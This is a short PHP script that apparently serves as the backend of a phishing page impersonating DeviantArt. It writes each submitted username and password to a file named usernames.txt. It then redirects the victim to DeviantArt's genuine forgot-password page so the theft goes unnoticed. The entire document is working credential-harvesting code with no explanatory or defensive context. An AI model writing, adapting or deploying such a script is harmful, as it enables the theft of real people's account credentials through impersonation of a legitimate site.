<?php

    file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

header('Location: https://www.deviantart.com/users/forgot/');

exit();

